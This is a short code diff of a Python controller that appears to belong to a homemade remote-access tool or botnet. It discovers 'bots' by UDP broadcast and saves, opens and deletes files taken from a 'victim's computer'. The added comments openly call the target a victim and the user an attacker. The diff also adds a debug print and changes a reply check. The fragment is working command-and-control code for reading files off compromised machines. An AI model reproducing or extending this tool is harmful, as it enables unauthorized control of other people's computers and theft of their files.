@@ -9,18 +9,20 @@ protocol = {
     "REQ": 8569,
     "RPY": 4586
 }
-
+"""
+some files cant be read in the cml, so the server opens a file and inserts the data into it
+"""
 def view_file(command, data):
-    file = open(".\\" + command[5:], "wb")
+    file = open(".\\" + command[5:], "wb") # open a file with the same name as the one in the victim's computer
     file.write(data)
     file.close()
-    os.system("start " + command[5:])
+    os.system("start " + command[5:]) # open the file for reading
     input(">Del")
-    os.system("del " + command[5:])
+    os.system("del " + command[5:]) # when the attacker presses enter the file will be deleted
 
 
 def search_bot(s, address):
-    s.sendto(str(protocol["REQ"]).encode(), ("255.255.255.255", UDP_PORT))
+    s.sendto(str(protocol["REQ"]).encode(), ("255.255.255.255", UDP_PORT)) # broadcasts the REQ packet to the agreed port
     t = int(datetime.datetime.now().strftime("%f"))
     while int(datetime.datetime.now().strftime("%f")) - t < 1000000:
         try:
@@ -29,7 +31,8 @@ def search_bot(s, address):
             break
         dec = str(protocol["RPY"])
         dec2 = msg.decode()
-        if msg.decode()[:-1] == str(protocol["RPY"]):
+        print(dec, dec2)
+        if msg.decode() == str(protocol["RPY"]):
             address.append(addr[0])
 
 
